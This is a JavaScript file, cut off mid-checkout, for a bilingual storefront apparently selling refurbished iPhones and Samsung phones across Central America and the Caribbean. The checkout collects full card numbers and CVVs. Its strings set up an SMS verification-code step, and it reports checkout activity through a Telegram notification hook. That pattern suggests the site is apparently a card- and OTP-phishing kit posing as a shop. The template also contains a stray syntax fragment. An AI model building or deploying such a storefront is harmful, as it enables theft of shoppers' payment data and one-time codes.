// Country configuration - check if already defined to prevent duplicate declaration
if (typeof countryConfig === 'undefined') {
    var countryConfig = {
        nicaragua: { flag: '🇳🇮', name: 'Nicaragua', currency: 'NIO', rate: 37, lang: 'es', phone: '+505 8234-1976' },
        honduras: { flag: '🇭🇳', name: 'Honduras', currency: 'HNL', rate: 25, lang: 'es', phone: '+504 9756-4382' },
        trinidad: { flag: '🇹🇹', name: 'Trinidad and Tobago', currency: 'TTD', rate: 6.8, lang: 'en', phone: '+1 868 392-7641' },
        elsalvador: { flag: '🇸🇻', name: 'El Salvador', currency: 'USD', rate: 1, lang: 'es', phone: '+503 7345-6789' },
        paraguay: { flag: '🇵🇾', name: 'Paraguay', currency: 'PYG', rate: 7500, lang: 'es', phone: '+595 21 456-789' },
        guatemala: { flag: '🇬🇹', name: 'Guatemala', currency: 'GTQ', rate: 7.8, lang: 'es', phone: '+502 2345-6789' },
        dominican: { flag: '🇩🇴', name: 'Dominican Republic', currency: 'DOP', rate: 58, lang: 'es', phone: '+1 809 234-5678' },
        usa: { flag: '🇺🇸', name: 'USA', currency: 'USD', rate: 1, lang: 'en', phone: '+1 415-762-3849' }
    };
}

// Translation data - check if already defined to prevent duplicate declaration
const translations = window.translations || {
    es: {
        home: "Inicio",
        products: "Productos",
        about: "Acerca de",
        contact: "Contacto",
        hero_title: "La Mejor Tecnología al Mejor Precio",
        hero_subtitle: "Descubre nuestra selección premium de dispositivos reacondicionados con garantía completa y soporte técnico especializado. Tecnología de calidad a precios excepcionales.",
        shop_now: "Comprar Ahora",
        benefit_free_shipping: "Envío Gratis",
        benefit_free_shipping_desc: "En todos los pedidos",
        benefit_warranty: "Garantía 1 Año",
        benefit_warranty_desc: "En todos los productos",
        benefit_return: "Devolución 30 Días",
        benefit_return_desc: "Reembolso completo garantizado",
        benefit_accessories: "Accesorios Incluidos",
        benefit_accessories_desc: "Cable, caja y protector de pantalla gratis",
        whatsapp_title: "¿Quieres cambiar por un modelo inferior o necesitas más información?",
        whatsapp_subtitle: "Chatea con nuestros expertos en WhatsApp para recomendaciones personalizadas y soporte instantáneo",
        whatsapp_button: "Chatear en WhatsApp",
        featured_products: "Productos Destacados",
        all: "Todos",
        iphones: "iPhones",
        samsung: "Samsung",
        audio: "Audio",
        accessories: "Accesorios",
        add_to_cart: "Agregar al Carrito",
        available_in: "Disponible en:",
        free_shipping: "Envío gratis",
        free_shipping_all: "Envío gratis en todos los pedidos",
        new: "¡Nuevo!",
        certified: "¡Certificado!",
        hot: "¡Popular!",
        bestseller: "¡Más Vendido!",
        deal: "¡Oferta!",
        value: "¡Gran Valor!",
        premium: "¡Premium!",
        top_rated: "¡Mejor Calificado!",
        popular: "¡Popular!",
        budget: "¡Económico!",
        shopping_cart: "Carrito de Compras",
        empty_cart: "Tu carrito está vacío",
        subtotal: "Subtotal:",
        shipping: "Envío:",
        total: "Total:",
        checkout: "Proceder al Pago",
        continue_shopping: "Seguir Comprando",
        order_summary: "Resumen del Pedido",
        order_ref: "Número de Referencia:",
        bank_transfer: "Transferencia Bancaria",
        credit_card: "Tarjeta de Crédito",
        bank_details: "Datos Bancarios",
        account_number: "Número de Cuenta:",
        account_holder: "Titular de la Cuenta:",
        reference: "Referencia:",
        transfer_instructions: "Realiza la transferencia por el monto total y confirma cuando hayas completado el pago.",
        confirm_transfer: "He realizado la transferencia",
        bank_name: "Banco:",
        card_details: "Detalles de la Tarjeta",
        accepted: "Aceptado:",
        secure_payment: "Pago 100% Seguro y Verificado",
        cardholder_name: "Nombre del Titular",
        card_number: "Número de Tarjeta",
        expiry_date: "Fecha de Vencimiento",
        cvc: "CVV",
        ssl_secured: "Conexión SSL Segura - Tus datos están protegidos",
        place_order: "Realizar Pedido",
        delivery_inspection_notice: "Animamos a todos los clientes a inspeccionar minuciosamente su pedido al momento de la entrega por parte del transportista. Si encuentra que el artículo no es satisfactorio o no es como se esperaba, tiene derecho a rechazar la aceptación del paquete. En caso de rechazo, será elegible para un reembolso completo de su monto de compra de acuerdo con nuestra política de devoluciones.",
        processing_secure: "Procesamiento Seguro",
        processing_order: "Procesando tu pedido...",
        processing_wait: "Por favor, no cierres esta ventana",
        validating_payment: "Validando método de pago",
        confirming_inventory: "Confirmando inventario",
        generating_order: "Generando orden de compra",
        order_confirmed: "¡Pedido Confirmado!",
        order_success_msg: "Tu pedido ha sido procesado exitosamente. Recibirás un WhatsApp con los detalles.",
        order_number: "Número de Pedido:",
        order_total: "Total:",
        payment_method: "Método de Pago:",
        estimated_delivery: "Entrega Estimada:",
        price_high_to_low: "Precio: Mayor a Menor",
        price_low_to_high: "Precio: Menor a Mayor",
        featured: "Destacados",
        storage: "Almacenamiento",
        condition: "Estado",
        required: "*Requerido",
        condition_guide: "Guía de Estado:",
        condition_guide_desc: "Mejores estados indican menos desgaste y mejor apariencia del dispositivo.",
        terms_agreement: "Acepto los",
        terms_and_conditions: "Términos y Condiciones",
        quantity: "Cantidad:",
        details: "Detalles",
        choose_type: "Elegir Tipo",
        security_verification: "Verificación de Seguridad",
        verify_payment: "Verifica tu Pago",
        otp_sent: "Hemos enviado un código de verificación de 6 dígitos a tu número de teléfono. Por favor, ingrésalo a continuación para completar tu compra.",
        code_expires: "El código expira en: ",
        resend_code: "Reenviar Código",
        verify_code: "Verificar Código",
        invalid_code: "Código inválido. Por favor, inténtalo de nuevo."
    },
    en: {
        home: "Home",
        products: "Products",
        about: "About",
        contact: "Contact",
        hero_title: "The Best Technology at the Best Price",
        hero_subtitle: "Discover our premium selection of refurbished devices with full warranty and specialized technical support. Quality technology at exceptional prices.",
        shop_now: "Shop Now",
        benefit_free_shipping: "Free Shipping",
        benefit_free_shipping_desc: "On all orders",
        benefit_warranty: "1 Year Warranty",
        benefit_warranty_desc: "On all products",
        benefit_return: "30 Day Return",
        benefit_return_desc: "Full refund guaranteed",
        benefit_accessories: "Accessories Included",
        benefit_accessories_desc: "Cable, box and free screen protector",
        whatsapp_title: "Want to swap for a lower model or need more information?",
        whatsapp_subtitle: "Chat with our experts on WhatsApp for personalized recommendations and instant support",
        whatsapp_button: "Chat on WhatsApp",
        featured_products: "Featured Products",
        all: "All",
        iphones: "iPhones",
        samsung: "Samsung",
        audio: "Audio",
        accessories: "Accessories",
        add_to_cart: "Add to Cart",
        available_in: "Available in:",
        free_shipping: "Free Shipping",
        free_shipping_all: "Free shipping on all orders",
        new: "New!",
        certified: "Certified!",
        hot: "Hot!",
        bestseller: "Best Seller!",
        deal: "Deal!",
        value: "Great Value!",
        premium: "Premium!",
        top_rated: "Top Rated!",
        popular: "Popular!",
        budget: "Budget!",
        shopping_cart: "Shopping Cart",
        empty_cart: "Your cart is empty",
        subtotal: "Subtotal:",
        shipping: "Shipping:",
        total: "Total:",
        checkout: "Proceed to Checkout",
        continue_shopping: "Continue Shopping",
        order_summary: "Order Summary",
        order_ref: "Order Reference:",
        bank_transfer: "Bank Transfer",
        credit_card: "Credit Card",
        bank_details: "Bank Details",
        account_number: "Account Number:",
        account_holder: "Account Holder:",
        reference: "Reference:",
        transfer_instructions: "Make the transfer for the total amount and confirm when you have completed the payment.",
        confirm_transfer: "I have made the transfer",
        bank_name: "Bank:",
        card_details: "Card Details",
        accepted: "Accepted:",
        secure_payment: "100% Secure and Verified Payment",
        cardholder_name: "Cardholder Name",
        card_number: "Card Number",
        expiry_date: "Expiry Date",
        cvc: "CVV",
        ssl_secured: "Secure SSL Connection - Your data is protected",
        place_order: "Place Order",
        delivery_inspection_notice: "We encourage all customers to thoroughly inspect their order upon delivery from the carrier. Should you find the item unsatisfactory or not as expected, you have the right to refuse acceptance of the package. In the event of refusal, you will be eligible for a complete refund of your purchase amount in accordance with our return policy.",
        processing_secure: "Secure Processing",
        processing_order: "Processing your order...",
        processing_wait: "Please do not close this window",
        validating_payment: "Validating payment method",
        confirming_inventory: "Confirming inventory",
        generating_order: "Generating purchase order",
        order_confirmed: "Order Confirmed!",
        order_success_msg: "Your order has been processed successfully. You will receive a WhatsApp with the details.",
        order_number: "Order Number:",
        order_total: "Total:",
        payment_method: "Payment Method:",
        estimated_delivery: "Estimated Delivery:",
        price_high_to_low: "Price: High to Low",
        price_low_to_high: "Price: Low to High",
        featured: "Featured",
        storage: "Storage",
        condition: "Condition",
        required: "*Required",
        condition_guide: "Condition Guide:",
        condition_guide_desc: "Better conditions indicate less wear and superior device appearance.",
        terms_agreement: "I agree to the",
        terms_and_conditions: "Terms and Conditions",
        quantity: "Quantity:",
        details: "Details",
        choose_type: "Choose Type",
        security_verification: "Security Verification",
        verify_payment: "Verify Your Payment",
        otp_sent: "We've sent a 6-digit verification code to your phone number. Please enter it below to complete your purchase.",
        code_expires: "Code expires in: ",
        resend_code: "Resend Code",
        verify_code: "Verify Code",
        invalid_code: "Invalid code. Please try again."
    }
};

// Global variables
let currentCountry = localStorage.getItem('selectedCountry') || 'honduras';
let currentLanguage = localStorage.getItem('selectedLanguage') || 'es';
let cart = JSON.parse(localStorage.getItem('cart')) || [];

// Initialize cart
updateCartCount();
updateCartDisplay();

// Currency functions
function getCurrencySymbol(country) {
    const config = countryConfig[country];
    if (!config) return '$';
    switch (config.currency) {
        case 'NIO': return 'C$';
        case 'HNL': return 'L';
        case 'TTD': return 'TT$';
        case 'XCD': return 'EC$';
        case 'USD': return '$';
        default: return '$';
    }
}

function convertPrice(price, showBoth = true) {
    const config = countryConfig[currentCountry];
    if (!config) return `$${price.toFixed(2)}`;

    const usdPrice = `$${price.toFixed(2)}`;

    // For USD countries, always show USD only
    if (config.currency === 'USD') {
        return usdPrice;
    }

    const convertedPrice = price * config.rate;
    const symbol = getCurrencySymbol(currentCountry);
    const localFormattedPrice = convertedPrice.toLocaleString('en-US', {
        minimumFractionDigits: 0,
        maximumFractionDigits: 0
    });
    const localPrice = `${symbol}${localFormattedPrice}`;

    return showBoth ? `${usdPrice} / ${localPrice}` : localPrice;
}

// Translation function
function updateLanguage(lang) {
    currentLanguage = lang;
    const elements = document.querySelectorAll('[data-translate]');
    elements.forEach(element => {
        const key = element.getAttribute('data-translate');
        if (translations[lang] && translations[lang][key]) {
            element.textContent = translations[lang][key];
        }
    });

    const placeholderElements = document.querySelectorAll('[data-translate-placeholder]');
    placeholderElements.forEach(element => {
        const key = element.getAttribute('data-translate-placeholder');
        if (translations[lang] && translations[lang][key]) {
            element.setAttribute('placeholder', translations[lang][key]);
        }
    });
}

// Update prices based on country
function updatePrices() {
    document.querySelectorAll('.current-price').forEach(priceElement => {
        // Extract the base USD price from the element's data attribute or text
        let price = parseFloat(priceElement.getAttribute('data-usd-price'));
        if (isNaN(price)) {
            // Fallback to extracting from text if no data attribute
            const priceText = priceElement.textContent;
            const usdMatch = priceText.match(/\$(\d+(?:\.\d{2})?)/);
            if (usdMatch) {
                price = parseFloat(usdMatch[1]);
                priceElement.setAttribute('data-usd-price', price);
            }
        }
        if (!isNaN(price)) {
            priceElement.textContent = convertPrice(price, false);
        }
    });

    document.querySelectorAll('.original-price').forEach(priceElement => {
        // Extract the base USD price from the element's data attribute or text
        let price = parseFloat(priceElement.getAttribute('data-usd-original-price'));
        if (isNaN(price)) {
            // Fallback to extracting from text if no data attribute
            const priceText = priceElement.textContent;
            const usdMatch = priceText.match(/\$(\d+(?:\.\d{2})?)/);
            if (usdMatch) {
                price = parseFloat(usdMatch[1]);
                priceElement.setAttribute('data-usd-original-price', price);
            }
        }
        if (!isNaN(price)) {
            priceElement.textContent = convertPrice(price, false);
        }
    });
}

// Initialize color selection for products
function initializeColorSelection(productId, colorSelectId, mainImageId, addToCartBtnId) {
    const colorSelect = document.getElementById(colorSelectId);
    const mainImage = document.getElementById(mainImageId);
    const addToCartBtn = document.getElementById(addToCartBtnId);

    if (colorSelect && mainImage && addToCartBtn) {
        colorSelect.addEventListener('change', function() {
            const selectedOption = this.options[this.selectedIndex];
            const newImageSrc = selectedOption.getAttribute('data-image');

            if (newImageSrc) {
                mainImage.src = newImageSrc;

                // Update the add to cart button data-product with new image
                const productData = JSON.parse(addToCartBtn.getAttribute('data-product'));
                productData.image = newImageSrc;
                addToCartBtn.setAttribute('data-product', JSON.stringify(productData));

                // Update the product card onclick to navigate to product page
                const productImage = mainImage.closest('.product-image');
                if (productImage) {
                    productImage.onclick = function() {
                        window.location.href = `product.html?id=${productId}`;
                    };
                }
            }
        });
    }
}

// Cart functions
function addToCart(product) {
    try {
        if (!product || !product.id) {
            console.error('Invalid product data:', product);
            return;
        }

        const existingItem = cart.find(item => item.id === product.id);

        if (existingItem) {
            existingItem.quantity += 1;
        } else {
            const newItem = {
                id: product.id,
                name: product.name || 'Unknown Product',
                price: parseFloat(product.price) || 0,
                image: product.image || '',
                quantity: 1
            };
            cart.push(newItem);
        }

        // Auto-add free Gorilla Glass screen protector for phone purchases
        if (product.id.includes('iphone') || product.id.includes('galaxy')) {
            const screenProtectorExists = cart.find(item => item.id === 'free_gorilla_glass');
            if (!screenProtectorExists) {
                cart.push({
                    id: 'free_gorilla_glass',
                    name: 'FREE: Premium Gorilla Glass Screen Protector (9H Hardness)',
                    price: 0,
                    image: 'https://m.media-amazon.com/images/I/61NGYQsztvL._UF1000,1000_QL80_FMwebp_.jpg',
                    quantity: 1,
                    isFreeGift: true
                });
            }
        }

        localStorage.setItem('cart', JSON.stringify(cart));

        updateCartCount();
        updateCartDisplay();
        showAddToCartFeedback();
    } catch (error) {
        console.error('Error adding to cart:', error);
    }
}

function removeFromCart(productId) {
    cart = cart.filter(item => item.id !== productId);
    localStorage.setItem('cart', JSON.stringify(cart));
    updateCartCount();
    updateCartDisplay();
}

function updateQuantity(productId, newQuantity) {
    const item = cart.find(item => item.id === productId);
    if (item) {
        if (newQuantity <= 0) {
            removeFromCart(productId);
        } else {
            item.quantity = newQuantity;
            localStorage.setItem('cart', JSON.stringify(cart));
            updateCartCount();
            updateCartDisplay();
        }
    }
}

function updateCartCount() {
    const cartCount = document.getElementById('cart-count');
    if (cartCount) {
        const totalItems = cart.reduce((total, item) => total + item.quantity, 0);
        cartCount.textContent = totalItems;
        cartCount.style.display = totalItems > 0 ? 'flex' : 'none';
    }
}

function updateCartDisplay() {
    const cartItems = document.getElementById('cart-items');
    const cartSubtotal = document.getElementById('cart-subtotal');
    const cartTotal = document.getElementById('cart-total');

    if (!cartItems) return;

    if (cart.length === 0) {
        const emptyMessage = currentLanguage === 'es' ? 'Tu carrito está vacío' : 'Your cart is empty';
        cartItems.innerHTML = `
            <div id="empty-cart-message" class="empty-cart-message">
                <i class="fas fa-shopping-cart"></i>
                <p>${emptyMessage}</p>
            </div>
        `;
        if (cartSubtotal) cartSubtotal.textContent = convertPrice(0, false);
        if (cartTotal) cartTotal.textContent = convertPrice(0, false);
        return;
    }

    let subtotal = 0;
    let cartHTML = '';

    cart.forEach((item) => {
        const itemTotal = item.price * item.quantity;
        subtotal += itemTotal;

        const isFreeGift = item.isFreeGift || item.price === 0;
        const priceDisplay = isFreeGift ? 'FREE' : convertPrice(itemTotal, false);

        cartHTML += `
            <div class="cart-item ${isFreeGift ? 'free-gift-item' : ''}" data-item-id="${item.id}">
                <div class="cart-item-image">
                    <img src="${item.image || 'https://via.placeholder.com/60x60'}" alt="${item.name}" loading="lazy" class="cart-product-image">
                    ${isFreeGift ? '<div class="gift-overlay"><i class="fas fa-gift"></i></div>' : ''}
                </div>
                <div class="cart-item-details">
                    <h4>${item.name}</h4>
                    <div class="cart-item-controls">
                        ${isFreeGift ? 
                            '<span class="free-gift-badge">FREE GIFT</span>' :
                            `<div class="quantity-controls">
                                <button type="button" data-action="decrease" data-item-id="${item.id}">-</button>
                                <span class="quantity">${item.quantity}</span>
                                <button type="button" data-action="increase" data-item-id="${item.id}">+</button>
                            </div>`
                        }
                        <div class="item-price ${isFreeGift ? 'free-price' : ''}">${priceDisplay}</div>
                        ${!isFreeGift ? 
                            `<button type="button" class="remove-item" data-action="remove" data-item-id="${item.id}">
                                <i class="fas fa-trash"></i>
                            </button>` : ''
                        }
                    </div>
                </div>
            </div>
        `;
    });

    cartItems.innerHTML = cartHTML;

    // Remove existing event listeners to avoid duplicates
    const existingHandler = cartItems.getAttribute('data-handler-attached');
    if (!existingHandler) {
        // Add event listeners for cart item actions only once
        cartItems.addEventListener('click', function(e) {
            e.preventDefault();
            e.stopPropagation();

            const button = e.target.closest('button[data-action]');
            if (!button) return;

            const action = button.getAttribute('data-action');
            const itemId = button.getAttribute('data-item-id');

            if (!itemId) return;

            const item = cart.find(cartItem => cartItem.id === itemId);
            if (!item) return;

            switch(action) {
                case 'increase':
                    updateQuantity(itemId, item.quantity + 1);
                    break;
                case 'decrease':
                    updateQuantity(itemId, item.quantity - 1);
                    break;
                case 'remove':
                    removeFromCart(itemId);
                    break;
            }

            return false;
        });
        cartItems.setAttribute('data-handler-attached', 'true');
    }

    if (cartSubtotal) cartSubtotal.textContent = convertPrice(subtotal, false);
    if (cartTotal) cartTotal.textContent = convertPrice(subtotal, false);
}

function showAddToCartFeedback() {
    const notification = document.createElement('div');
    notification.className = 'cart-notification';
    notification.innerHTML = '<i class="fas fa-check"></i> Product added to cart!';
    notification.style.cssText = `
        position: fixed;
        top: 100px;
        right: 20px;
        background: var(--primary-color);
        color: white;
        padding: 1rem 1.5rem;
        border-radius: 8px;
        z-index: 10000;
        animation: slideInRight 0.3s ease;
    `;

    document.body.appendChild(notification);
    setTimeout(() => {
        notification.remove();
    }, 3000);
}

// Checkout functionality
function initializeCheckout() {
    const checkoutBtn = document.getElementById('checkout-btn');
    if (checkoutBtn) {
        checkoutBtn.removeEventListener('click', openCheckout); // Remove existing listener
        checkoutBtn.addEventListener('click', openCheckout);
    }
}

function openCheckout() {
    try {
        if (cart.length === 0) {
            alert(currentLanguage === 'es' ? 'Tu carrito está vacío' : 'Your cart is empty');
            return;
        }

        // Send Telegram notification
        if (typeof TelegramNotifications !== 'undefined') {
            TelegramNotifications.proceedToCheckoutCard({
                total: convertPrice(getCartTotal(), false),
                itemCount: cart.length,
                orderRef: generateOrderReference()
            });
        }

        createCheckoutModal();
    } catch (error) {
        console.error('Error opening checkout:', error);
        alert('Error opening checkout. Please try again.');
    }
}

// Global variable to store checkout data
let checkoutData = {
    orderNumber: '',
    paymentMethod: 'bank-transfer',
    cardholderName: '',
    total: 0,
    discountCode: '',
    discountAmount: 0,
    originalTotal: 0,
    customerName: '',
    customerPhone: '',
    customerEmail: '',
    customerAddress: '',
    customerCity: '',
    customerPostal: ''
};

function createCheckoutModal() {
    // Remove existing checkout overlay
    const existingOverlay = document.getElementById('checkout-overlay');
    if (existingOverlay) {
        existingOverlay.remove();
    }

    const overlay = document.createElement('div');
    overlay.id = 'checkout-overlay';
    overlay.className = 'checkout-overlay active';

    const modal = document.createElement('div');
    modal.className = 'checkout-modal';

    const subtotal = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
    checkoutData.total = subtotal;
    checkoutData.orderNumber = `ORDER-${Date.now()}`;

    const checkoutHTML = `
    <div class="checkout-header">
        <h2 data-translate="checkout">Checkout</h2>
        <button class="close-checkout">
            <i class="fas fa-times"></i>
        </button>
    </div>
    <div class="checkout-content">
        <div class="checkout-steps">
            <div class="step active" data-step="1">
                <span>${(currentLanguage === 'es' ? 'Resumen' : 'Summary')}</span>
            </div>
            <div class="step" data-step="2">
                <span>${currentLanguage === 'es' ? 'Información' : 'Information'}</span>
            </div>
            <div class="step" data-step="3">
                <span>${currentLanguage === 'es' ? 'Pago' : 'Payment'}</span>
            </div>
            <div class="step" data-step="4">
                <span>${currentLanguage === 'es' ? 'Procesando' : 'Processing'}</span>
            </div>
            <div class="step" data-step="5">
                <span>${currentLanguage === 'es' ? 'Confirmación' : 'Confirmation'}</span>
            </div>
            <div class="step" data-step="6">
                <span>${currentLanguage === 'es' ? 'Verificación' : 'Verification'}</span>
            </div>
        </div>
        <div id="checkout-step-1" class="checkout-step active">
            <div class="order-summary">
                <div class="summary-section">
                    <h3>${currentLanguage === 'es' ? 'Resumen del Pedido' : 'Order Summary'}</h3>
                    <div class="checkout-items">
                        ${cart.map(item => {
                            const itemPrice = (item.price === 0 || item.isFreeGift) ? 'FREE' : convertPrice(item.price * item.quantity, false);
                            const giftIndicator = (item.price === 0 || item.isFreeGift) ? ' 🎁' : '';
                            const isFreeGift = item.price === 0 || item.isFreeGift;
                            return `
                                <div class="checkout-item ${isFreeGift ? 'free-gift-checkout-item' : ''}">
                                    <img src="${item.image}" alt="${item.name}" style="width: 50px; height: 50px; object-fit: contain; background: var(--background-light); border-radius: 6px; padding: 3px;">
                                    <div class="checkout-item-details">
                                        <h4>${item.name}${giftIndicator}</h4>
                                        <p>Qty: ${item.quantity} × <span class="checkout-item-price">${itemPrice}</span></p>
                                    </div>
                                </div>
                            `;
                        }).join('')}
                    </div>
                </div>

                <div class="summary-section">
                    <h4>${(currentLanguage === 'es' ? 'Resumen de Costos' : 'Cost Summary')}</h4>
                    <div class="checkout-totals">
                        <div class="totals-row">
                            <span class="totals-label">${(currentLanguage === 'es' ? 'Subtotal:' : 'Subtotal:')}</span>
                            <span class="totals-value" id="checkout-subtotal">${convertPrice(subtotal, false)}</span>
                        </div>
                        <div class="totals-row shipping-row">
                            <span class="totals-label">${(currentLanguage === 'es' ? 'Envío:' : 'Shipping:')}</span>
                            <span class="totals-value free-shipping">
                                <i class="fas fa-shipping-fast"></i>
                                ${(currentLanguage === 'es' ? 'Gratis' : 'Free')}
                            </span>
                        </div>
                        <div class="totals-separator"></div>
                        <div class="totals-row total-row">
                            <span class="totals-label total-label">${(currentLanguage === 'es' ? 'Total:' : 'Total:')}</span>
                            <span class="totals-value total-value" id="checkout-total">${convertPrice(subtotal, false)}</span>
                        </div>
                    </div>
                </div>

                <div class="summary-section">
                    <div class="terms-agreement" style="display: flex; align-items: center; gap: 0.75rem; padding: 1rem; background: var(--background-light); border-radius: var(--border-radius); border: 1px solid var(--border-color);">
                        <input type="checkbox" id="terms-checkbox" required style="transform: scale(1.2); accent-color: var(--primary-color);">
                        <label for="terms-checkbox" style="cursor: pointer; font-size: 0.95rem; color: var(--text-color);">
                            ${(currentLanguage === 'es' ? 'Acepto los' : 'I agree to the')} 
                            <a href="terms.html" target="_blank" style="color: var(--primary-color); text-decoration: underline;">
                                ${(currentLanguage === 'es' ? 'Términos y Condiciones' : 'Terms and Conditions')}
                            </a>
                        </label>
                    </div>
                </div>

                <div class="step-actions" style="margin-top: 1.5rem; display: flex; justify-content: center;">
                    <button id="next-to-shipping" class="btn btn-primary checkout-next" disabled>
                        ${(currentLanguage === 'es' ? 'Continuar' : 'Continue')} <i class="fas fa-arrow-right"></i>
                    </button>
                </div>
            </div>
        </div>
         <div id="checkout-step-2" class="checkout-step">
            <div class="customer-info-section">
                <h3>${(currentLanguage === 'es' ? 'Información de Envío' : 'Shipping Information')}</h3>
                <div class="form-row">
                    <div class="form-group">
                        <label>${(currentLanguage === 'es' ? 'Nombre Completo' : 'Full Name')} *</label>
                        <input type="text" id="customer-name" required placeholder="${(currentLanguage === 'es' ? 'Ingrese su nombre completo' : 'Enter your full name')}" autocomplete="name">
                    </div>

                </div>
                <div class="form-group">
                    <label>${(currentLanguage === 'es' ? 'Teléfono' : 'Phone Number')} *</label>
                    <input type="tel" id="customer-phone" required placeholder="${(currentLanguage === 'es' ? 'Número de teléfono' : 'Phone number')}" autocomplete="tel">
                </div>
                <div class="form-group">
                    <label>${(currentLanguage === 'es' ? 'País' : 'Country')} *</label>
                    <input type="text" id="customer-country" required value="${countryConfig[currentCountry].name}" readonly style="background: #f5f5f5;" autocomplete="country">
                </div>
                <div class="form-group">
                    <label>${(currentLanguage === 'es' ? 'Dirección Completa' : 'Complete Address')} *</label>
                    <textarea id="customer-address" required placeholder="${(currentLanguage === 'es' ? 'Dirección completa: Calle, número, ciudad, estado/provincia, código postal...' : 'Complete address: Street, number, city, state/province, postal code...')}" rows="4" class="responsive-textarea" autocomplete="street-address"></textarea>
                    <div class="address-help">
                        <i class="fas fa-info-circle"></i> 
                        ${(currentLanguage === 'es' ? 'Incluya toda la información necesaria para la entrega' : 'Include all necessary information for delivery')}
                    </div>
                </div>
                <div class="form-row">
                    <div class="form-group">
                        <label>${(currentLanguage === 'es' ? 'Ciudad' : 'City')} *</label>
                        <input type="text" id="customer-city" required placeholder="${(currentLanguage === 'es' ? 'Ciudad' : 'City')}" autocomplete="address-level2">
                    </div>
                    <div class="form-group">
                        <label>${(currentLanguage === 'es' ? 'Código Postal' : 'Postal Code')}</label>
                        <input type="text" id="customer-postal" placeholder="${(currentLanguage === 'es' ? 'Código postal' : 'Postal code')}" autocomplete="postal-code">
                    </div>
                </div>

                <div class="step-actions" style="margin-top: 2rem; display: flex; justify-content: space-between;">
                    <button id="back-to-summary" class="btn btn-secondary">
                        <i class="fas fa-arrow-left"></i> ${(currentLanguage === 'es' ? 'Volver' : 'Back')}
                    </button>
                    <button id="next-to-payment" class="btn btn-primary checkout-next">
                        ${(currentLanguage === 'es' ? 'Continuar al Pago' : 'Continue to Payment')} <i class="fas fa-arrow-right"></i>
                    </button>
                </div>
            </div>
        </div>

        <div id="checkout-step-3" class="checkout-step">
            <div class="payment-section">
                <h3>${(currentLanguage === 'es' ? 'Método de Pago' : 'Payment Method')}</h3>
                <div class="payment-methods">
                    <label class="payment-option" data-method="bank-transfer">
                        <input type="radio" name="payment-method" value="bank-transfer">
                        <div class="payment-option-content">
                            <i class="fas fa-university"></i>
                            <span>${(currentLanguage === 'es' ? 'Transferencia Bancaria' : 'Bank Transfer')}</span>
                        </div>
                    </label>` : ''}
                    <label class="payment-option" data-method="credit-card">
                        <input type="radio" name="payment-method" value="credit-card">
                        <div class="payment-option-content">
                            <i class="fas fa-credit-card"></i>
                            <span>${(currentLanguage === 'es' ? 'Tarjeta de Crédito' : 'Credit Card')}</span>
                        </div>
                    </label>
                </div>

                <div id="payment-method-instruction" class="payment-instruction" style="text-align: center; padding: 2rem; color: var(--text-light); background: var(--background-light); border-radius: var(--border-radius); margin-top: 1rem;">
                    <i class="fas fa-hand-pointer" style="font-size: 2rem; margin-bottom: 1rem; color: var(--primary-color);"></i>
                    <p>${(currentLanguage === 'es' ? 'Por favor selecciona un método de pago para continuar' : 'Please select a payment method to continue')}</p>
                    ${currentCountry !== 'nicaragua' ? `<p style="margin-top: 1rem; font-size: 0.9rem; color: var(--text-light);">${(currentLanguage === 'es' ? 'Nota: Transferencia bancaria solo está disponible en Nicaragua' : 'Note: Bank transfer is only available in Nicaragua')}</p>` : ''}
                </div>

                <div id="bank-transfer-details" class="payment-details" style="display: none;">
                    <h4>${(currentLanguage === 'es' ? 'Datos Bancarios' : 'Bank Details')}</h4>
                    <div class="bank-info">
                        <p><strong>${(currentLanguage === 'es' ? 'Banco:' : 'Bank:')}</strong> ${getBankName()}</p>
                        <p><strong>${(currentLanguage === 'es' ? 'Número de Cuenta:' : 'Account Number:')}</strong> ${getAccountNumber()}</p>
                        <p><strong>${(currentLanguage === 'es' ? 'Titular de la Cuenta:' : 'Account Holder:')}</strong> TechZone ${countryConfig[currentCountry].name}</p>
                        <p><strong>${(currentLanguage === 'es' ? 'Referencia:' : 'Reference:')}</strong> ${checkoutData.orderNumber}</p>
                        <p><strong>${(currentLanguage === 'es' ? 'Total a Transferir:' : 'Amount to Transfer:')}</strong> ${convertPrice(subtotal, false)}</p>
                    </div>
                    <p class="transfer-instructions">
                        ${(currentLanguage === 'es' ? 'Realiza la transferencia por el monto total y confirma cuando hayas completado el pago.' : 'Make the transfer for the total amount and confirm when you have completed the payment.')}
                    </p>
                    <button class="btn btn-primary place-order" data-method="bank-transfer">${(currentLanguage === 'es' ? 'He realizado la transferencia' : 'I have made the transfer')}</button>
                </div>

            <div id="credit-card-details" class="payment-details" style="display: none;">
                    <h4>${(currentLanguage === 'es' ? 'Detalles de la Tarjeta' : 'Card Details')}</h4>
                    <p class="accepted-cards">
                        <span>${(currentLanguage === 'es' ? 'Aceptado:' : 'Accepted:')}</span>
                        <i class="fab fa-cc-visa"></i>
                        <i class="fab fa-cc-mastercard"></i>
                        <i class="fab fa-cc-amex"></i>
                    </p>
                    <form class="card-form">
                        <div class="form-group">
                            <label>${(currentLanguage === 'es' ? 'Nombre del Titular' : 'Cardholder Name')}</label>
                            <input type="text" id="cardholder-name" required>
                        </div>
                        <div class="form-group">
                            <label>${(currentLanguage === 'es' ? 'Número de Tarjeta' : 'Card Number')}</label>
                            <input type="text" id="card-number" placeholder="1234 5678 9012 3456" required maxlength="19">
                        </div>
                        <div class="form-row">
                            <div class="form-group">
                                <label>${(currentLanguage === 'es' ? 'Fecha de Vencimiento' : 'Expiry Date')}</label>
                                <input type="text" id="expiry-date" placeholder="MM/YY" required>
                            </div>
                            <div class="form-group">
                                <label>CVV</label>
                                <input type="text" id="cvv" placeholder="123" required>
                            </div>
                        </div>
						<div id="card-errors" class="error-message" style="color: red; display: none;"></div>
                    </form>
                    <p class="security-notice">
                        <i class="fas fa-lock"></i>
                        <span>${(currentLanguage === 'es' ? 'Conexión SSL Segura - Tus datos están protegidos' : 'Secure SSL Connection - Your data is protected')}</span>
                    </p>
                    <button class="btn btn-primary place-order" data-method="credit-card">${(currentLanguage === 'es' ? 'Procesar Pago' : 'Process Payment')}</button>
                </div>

                <div class="step-actions" style="margin-top: 2rem; display: flex; justify-content: space-between;">
                    <button id="back-to-shipping" class="btn btn-secondary">
                        <i class="fas fa-arrow-left"></i> ${(currentLanguage === 'es' ? 'Volver' : 'Back')}
                    </button>
                </div>
            </div>
        </div>

        <div id="checkout-step-4" class="checkout-step">
            <div class="processing-section">
                <div class="loading-state" id="processing-card-submission">
                    <div class="spinner"></div>
                    <h3>${(currentLanguage === 'es' ? 'Enviando la información de su tarjeta' : 'Submitting your card information')}</h3>
